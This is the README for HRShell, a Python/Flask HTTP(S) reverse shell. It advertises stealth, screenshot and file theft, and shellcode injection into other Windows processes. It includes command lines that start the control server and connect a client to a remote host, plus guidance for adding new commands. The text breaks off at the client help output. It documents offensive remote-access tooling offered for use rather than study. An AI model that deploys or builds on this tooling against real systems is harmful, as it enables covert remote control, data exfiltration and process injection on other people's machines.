__HRShell__ is an HTTPS/HTTP reverse shell built with flask. It's compatible with __python 2.x/3.x__ and has been successfully tested on:
*   ![](https://img.shields.io/badge/-white.svg??style=for-the-badge&logo=linux&linux&logoColor=black) Linux ubuntu 18.04 LTS
*   ![](https://img.shields.io/badge/-white.svg??style=for-the-badge&logo=apple&windows&logoColor=black) macOS Mojave
*   ![](https://img.shields.io/badge/-white.svg??style=for-the-badge&logo=windows&windows&logoColor=black) Windows 7/10

### üéâ Features

*   It's stealthy
*   __TLS__ support üîë
    -   Either using _on-the-fly_ certificates or
    -   By specifying a cert/key pair (_more details below..._)
*   Proxy support on client.
*   Directory navigation (`cd` command and variants).
*   `download/upload/screenshot` commands available.
*   shellcode injection üíâ (_for the time it is available only for windows x86 systems_)
    -   Either shellcode injection into another process by specifying its PID
    -   or shellcode injection in the current running process
*   Pipelining (`|`) & chained commands (`;`) are supported
*   Support for every non-interactive (_like gdb, top etc..._) command
*   Server is both HTTP & HTTPS capable.
*   It comes with two built-in servers üåê so far... _flask built-in_ & _tornado-WSGI_ while it's also compatible with other production servers like [`gunicorn`](http://gunicorn.org/) and [`Nginx`](https://www.nginx.com/).
*   Both `server.py` and `client.py` are easily extensible.
*   Since the most functionality comes from server's endpoint-design it's very easy to write a client in any other language _e.g. java, GO etc..._

### Details
* * *

#### TLS üîë

__Server-side:__
Unless `--http` option is specified, by default `server.py` is HTTPS using _on-the-fly_ certificates, since on-the-fly certificates are a built-in flask-feature. But if `-s tornado` option is specified in order to make the server use TLS, a `--cert` and a `--key` option must be specified like so:

```
python server.py -s tornado --cert /path/cert.pem --key /path/key.pem
```

Either "real" certificates can be used or another way to generate a cert/key pair is using [openssl](https://www.openssl.org/) like so:

```
openssl req -x509 -newkey rsa:4096 -nodes -out cert.pem -keyout key.pem -days 365
```

A cert/key pair can also be used with the flask-server:
```
python server.py --cert /path/cert.pem --key /path/key.pem
```

> ‚ö†Ô∏è If the server is using TLS, then by design the client can't use `http://...` to connect to the server, but must explicitly use `https` instead.

__Client-side:__
By default client's SSL verification is disabled, unless:
*   either the `--cert` parameter is specified e.g.:
    ```
    python client.py -s https://192.168.10.7:5000 --cert /path/cert.pem
    ```
*   or the `CERT` variable, instead of the default `None` value is set beforehand with a valid certificate e.g.:
    ```python
    CERT = """
    -----BEGIN CERTIFICATE-----
    MIIBoDCCAUoCAQAwDQYJKoZIhvcNAQEEBQAwYzELMAkGA1UEBhMCQVUxEzARBgNV
    BAgTClF1ZWVuc2xhbmQxGjAYBgNVBAoTEUNyeXB0U29mdCBQdHkgTHRkMSMwIQYD
    VQQDExpTZXJ2ZXIgdGVzdCBjZXJ0ICg1MTIgYml0KTAeFw05NzA5MDkwMzQxMjZa
    ...
    -----END CERTIFICATE-----
    """
    ```

> ‚ö†Ô∏è When `--cert/-c` is used on client-side, then it is strongly suggested that an absolute path to the certificate is given. The reason to that is that if the server send a _e.g._ `cd ../` command then because the client will actually execute this command and will change directory, if the absolute path to the certificate is not provided the connection will drop.

#### Available commands:

Special commands:
```
upload <file or path-to-file>: uploads a file to the client
download <file or path-to-file>: downloads a file from the client
screenshot: downloads a screenshot from the client and then deletes it
migrate <PID>: attempts to inject shellcode on the process with the specific PID
inject shellcode: injects shellcode into current process
clear: clears the screen (it's the same for both unix and windows systems)
exit: closes the connection with the client
```

Any other command is supported if it's __not__ interactive like _e.g. gdb, top etc..._ Also by typing `python server.py -h` or `python client.py -h` you can get information the server and client available arguments.

__Note:__ If a client is connected with the server and we want to terminate the server, before press <kbd>CTRL</kbd>+<kbd>C</kbd>, we have to close the connection using the `exit` command.

#### Shellcode injection

> ‚ö†Ô∏è For now shellcode injection can be performed only in x86 windows systems.

##### Notes

*   A basic prerequisite for the injection to work is to have set `shellcode` variable, on client.py, to a valid shellcode.
*   In case the injection happens on a process, then process-permissions play a very important role. It's not always possible to inject on any process due to lack of appropriate privileges.
*    When the injection happens on the current process which in fact is the client.py, then the HTTP(S) will probably hang if the injection is successful.

#### Creating custom commands
__Client-side:__

In order to create a _custom_ command, generally:
*   a regex rule that describes the command must be defined on client-side
*   the code to handle that command must be added as an `elif` statement also on client-side.

__Server-side:__

If the command demands the existence of a new-endpoint on server-side, then:
*   to define the endpoint:
    ```python
    @app.route('/custom_endpoint/<arg>')
    def custom_endpoint(arg):
        """
        documentation if needed
        """
        ...
        return ...
    ```
*   then edit `handleGET()` to redirect the client to that endpoint:
    ```python
    @app.route('/')
    def handleGET():
        ...
        return redirect(url_for('custom_endpoint',
            arg=...)
            )
    ```
*   do the appropriate edits in `handlePOST()` to handle the presentation of the results.

#### Script-Arguments

Both scripts (_server.py_ and _client.py_) can be customized through arguments:

__server.py__
```
$ python server.py -h
usage: server.py [-h] [-s] [-c] [--host] [-p] [--http] [--cert] [--key]

server.py: An HTTP(S) reverse-shell server with advanced features.

  -h, --help      show this help message and exit
  -s , --server   Specify the HTTP(S) server to use (default: flask).
  -c , --client   Accept connections only from the specified client/IP.
  --host          Specify the IP to use (default: 0.0.0.0).
  -p , --port     Specify a port to use (default: 5000).
  --http          Disable TLS and use HTTP instead.
  --cert          Specify a certificate to use (default: None).
  --key           Specify the corresponding private key to use (default: None).
```
__client.py__
```
$ python client.py -h

client.py: An HTTP(S) client with advanced features.
